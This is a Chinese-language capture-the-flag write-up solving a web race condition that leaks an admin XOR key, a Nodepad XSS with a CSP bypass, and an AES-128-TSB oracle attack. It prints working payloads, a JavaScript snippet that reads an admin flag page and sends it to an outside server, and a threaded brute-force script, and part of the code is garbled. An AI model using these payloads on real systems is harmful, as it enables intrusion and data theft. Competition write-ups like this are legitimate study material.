首先是/login/user
    @app.route('/login/user', methods=['POST'])
    def do_login_user_post():
      username = get_required_params("POST", ['login'])['login']
      backend.cache_save(
        sid=flask.session.sid,
        value=backend.get_key_for_user(username)
      )
      state = backend.check_user_state(username)
      if state > 0:
        add_msg("user has {} state code ;/ contact backend admin ... ".format(state))
        return do_render()
      flask.session[K_LOGGED_IN] = False
      flask.session[K_AUTH_USER] = username
      return do_302("/login/auth")
这个函数分为两步：
  1. 缓存当前用户sid对应的key
        backend.cache_save(
     sid=flask.session.sid,
     value=backend.get_key_for_user(username)
    )
  2. 设置session[K_LOGGED_IN]和session[K_AUTH_USER]
        flask.session[K_LOGGED_IN] = False
    flask.session[K_AUTH_USER] = username
然后验证密码后登陆。
添加note的逻辑如下，会根据sid从cache中取出key，然后和note明文异或加密并存储。
    @app.route("/note/add", methods=['POST'])
    @loginzone
    def do_note_add_post():
      text = get_required_params("POST", ["text"])["text"]
      key = backend.cache_load(flask.session.sid)
      if key is None:
        raise WebException("Cached key")
      text = backend.xor_1337_encrypt(
        data=text,
        key=key,
      )
      note = model.Notes(
        username=flask.session[K_LOGGED_USER],
        message=backend.hex_encode(text),
      )
      sql_session.add(note)
      sql_session.commit()
      add_msg("Done !")
      return do_render()
如果在添加note的时候取出的key是admin的key，那么我们异或这个note的明文（自己输入的）和密文（可以查看）就能得到key。  
我们利用/login/user的第一步操作（缓存当前用户sid对应的key）就可以修改key，即往/login/user传入login=admin即可。当然之后session[K_LOGGED_IN]会被设置为False，所以需要竞争。
具体操作流程（均在同一session下）：
  1. 首先登录自己的账号；
  2. 然后不断添加note，内容为aaaaa....（尽可能长），可以用Burpsuite的Intruder操作；
  3. 登录admin
这个时候查看自己新添加的一系列note，找到用自己的key解不出的密文，说明该密文用admin的key加密了。如图，不知为何会登上一个叫seadog的号，不过密文是用admin的key进行加密的。  
写脚本，解密id为1的note即可
    a = '2ED0F9CDF3D3B08FCDCE032388DAE07C8E1B4B1298B7256AA31A3C1C1E4B5D5AE28196BF88174B1BF041E5897E941AA34F404BA28BBAA12A45726FBD6ACF45184DE9D7A0509A5B60EBA6AFC64FAF6CDBD3270000298DCB431D0C3CACBFF9B9F0B618FA5B'
    b = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    c = '07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2'
    ans = ''
    for i in range(0,200,2):
        x = int(a[i:i+2],16)^97^int(c[i:i+2],16)
        ans+=chr(x)
        print(ans)
### Nodepad
题目提供了源码，可发现对title和content进行了过滤，不允许''，但是当传入的title或content是字典（对象）的时候是可以被绕过的。  
例如{'a':'zzm"}]],"_csrf":"zEZvdIw1-6MDIMRPH3de_9mqEP_UygALE6t0"}
存入数据库时会将字典转化为可打印字符串形式，payload不会受到影响。  
另外还需要绕过CSP限制，这个用base标签即可。  
最终的exp如下，这里先闭合掉script标签，然后引入base标签：
    {"title":"a","content":["a",[{"w":""}]],"_csrf":"zEZvdIw1-6MDIMRPH3de_9mqEP_UygALE6t0"}
然后在自己的服务器上（
    var a = new XMLHttpRequest();
    a.open('GET', 'http://nodepad.hackable.software:3000/admin/flag', false);
    a.send(null);
    b = a.responseText;
    location.href = 'http://zzm.cat:8080/?c=' + escape(b);
## Crypto
### AES-128-TSB
对于给定的串`x`，如果把 `a+xor(a,x)+a`
拿去解密，结果即为`xor(a,aes.decrypt(x))`，那么可以先枚举`a`的最后一位，从而得到`aes.decrypt(x)`的最后一位。然后可以控制解密串的长度，逐位尝试即可得到`aes.decrypt(x)`的值
能够模拟`aes.decrypt`之后可以把上面的`x`设为`chr(0)*16`，`a`设为`xor(aes.decrypt(x),'gimme_flag')`，这样可以得到加密的flag，然后模拟解密即可
下面是脚本，不知道为啥，跑一会就炸,跑完一组（`16`位）后很快就炸了...那就分组跑手动把答案记下来也还行.....
    #!/usr/bin/env python2
    import SocketServer
    import socket
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from struct import pack, unpack
    #from secret import AES_KEY, FLAG
    class CryptoError(Exception):
        pass
    def split_by(data, step):
        return [data[i : i+step] for i in xrange(0, len(data), step)]
    def xor(a, b):
        assert len(a) == len(b)
        return ''.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])
    def pad(msg):
        byte = 16 - len(msg) % 16
        return msg + chr(byte) * byte
    def unpad(msg):
        if not msg:
            return ''
        return msg[:-ord(msg[-1])]
    def tsb_encrypt(aes, msg):
        msg = pad(msg)
        iv = get_random_bytes(16)
        prev_pt = iv
        prev_ct = iv
        ct = ''
        for block in split_by(msg, 16) + [iv]:
            ct_block = xor(block, prev_pt)
            ct_block = aes.encrypt(ct_block)
            ct_block = xor(ct_block, prev_ct)
            ct += ct_block
            prev_pt = block
            prev_ct = ct_block
        return iv + ct
    def tsb_decrypt(aes, msg):
        iv, msg = msg[:16], msg[16:]
        prev_pt = iv
        prev_ct = iv
        pt = ''
        for block in split_by(msg, 16):
            pt_block = xor(block, prev_ct)
            pt_block = aes.decrypt(pt_block)
            pt_block = xor(pt_block, prev_pt)
            pt += pt_block
            prev_pt = pt_block
            prev_ct = block
        pt, mac = pt[:-16], pt[-16:]
        if mac != iv:
            raise CryptoError()
        #print pt.encode('hex')
        return unpad(pt)
    def send_binary(s, msg):
        s.sendall(pack(' 0:
            data = s.recv(length)
            if data == '':
                raise EOFError()
            buf += data
            length -= len(data)
        return buf
    def recv_binary(s):
        size = recv_exact(s, 4)
        size = unpack('<I', size)[0]
        return recv_exact(s, size)
    def recv_enc(s, aes):
        data = recv_binary(s)
        return tsb_decrypt(aes, data)
    def main0(s):
        aes = AES.new(AES_KEY, AES.MODE_ECB)
        try:
            while True:
                a = recv_binary(s)
                b = recv_enc(s, aes)
                if a == b:
                    if a == 'gimme_flag':
                        send_enc(s, aes, FLAG)
                    else:
                        # Invalid request, send some random garbage instead of the
                        # flag :)
                        send_enc(s, aes, get_random_bytes(len(FLAG)))
                else:
                    send_binary(s, 'Looks like you don\'t know the secret key? Too bad.')
        except (CryptoError, EOFError):
            pass
    import sys,time
    aes = AES.new('a'*16, AES.MODE_ECB)
    t='gimme_flag'
    t2=pad(t)
    x2='u'*16
    print tsb_decrypt(aes,t2+x2+t2)
    #exit()
    def chk(x,y):
        if False:
            aes = AES.new('a'*16, AES.MODE_ECB)
            t=tsb_decrypt(aes,y)
            #print t.encode('hex'),len(t)
            return x==t
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('aes-128-tsb.hackable.software',1337))
        send_binary(s,x)
        send_binary(s,y)
        #t=_recv(s,1024)
        #time.sleep(0.5)
        t=recv_binary(s)
        #print t.encode('hex'),len(t)
        #print t
        return t.find('bad')==-1
    from threading import Thread,RLock
    rid=-1
    def bchk(x,y,id,req):
        global rid
        #print '[',chk(x,y),']'
        if chk(x,y)==req:
            rid=id
    def batch_chk(l):
        u=[]
        for i in l:
            t=Thread(target=bchk,args=i)
            t.setDaemon(True)
            t.start()
            u.append(t)
        while True:
            cnt=0
            for i in u:
                if i.isAlive():
                    cnt+=1
            if cnt==0:break
            #print cnt
            time.sleep(0.5)
    '''
    t2='ff4fb55ec0fa0d54339e'.decode('hex')+chr(0)*5+chr(90^6)
    #print chk('gimme_flag',t2*3)
    l=[]
    #l.append(('fafa','a'*48,1))
    #l.append(('gimme_flag',t2*3,1))
    for i in range(256):
        l.append(('gimme_flag',('ff4fb55ec0fa0d5433'.decode('hex')+chr(i)+chr(0)*5+chr(90^6))*3,i))
    batch_chk(l)
    print rid
    '''
    def guess(block):
        global rid
        l=[]
        for i in range(256):
            t=chr(0)*15+chr(i)
            #print i,chk('',t+xor(t,block)+t)
            l.append(('',t+xor(t,block)+t,i,False))
        rid=-1
        batch_chk(l)
        print 'rid:',rid
        v=rid
        v-=v%16
        rid=-1
        l=[]
        for i in range(v,v+16):
            t=chr(0)*15+chr(i)
            l.append(('',t+xor(t,block)+t,i,True))
        batch_chk(l)
        lst_byte=rid
        #lst_byte=54
        print 'lst_byte:',lst_byte
        fi=''
        for i in range(15):
            l=[]
            for j in range(256):
                t=fi+chr(j)+chr(0)*(14-i)+chr(lst_byte^(15-i))
                l.append((chr(0)*(i+1),t+xor(t,block)+t,j,True))
            rid=-1
            batch_chk(l)
            print 'rid:',i,rid
            fi+=chr(rid)
        return fi+chr(lst_byte)
    x='1eba25153b0311dfb283fd48a2a3c5a54b68d8e8752fd6d35b3f139ad6e7a440749666395020c991e6ce3f902fb9401eed33bbd630d2729e01097ca67c87278f86bf9193b59a182cf481bed43c03d2e7b60e808ab046307a093792b89848887d'
    x=x.decode('hex')
    #print guess(x[16:32])
    #exit()
    def fafa_decrypt(msg):
        iv, msg = msg[:16], msg[16:]
        prev_pt = iv
        prev_ct = iv
        pt = ''
        cnt=0
        for block in split_by(msg, 16):
            cnt+=1
            pt_block = xor(block, prev_ct)
            if cnt==1:
                pt_block=xor('DrgnS{Thank_god_',prev_pt)
            else:
                pt_block = guess(pt_block)
            pt_block = xor(pt_block, prev_pt)
            pt += pt_block
            prev_pt = pt_block
            prev_ct = block
            print pt
        pt, mac = pt[:-16], pt[-16:]
        if mac != iv:
            raise CryptoError()
        #print pt.encode('hex')
        print unpad(pt)
    fafa_decrypt(x)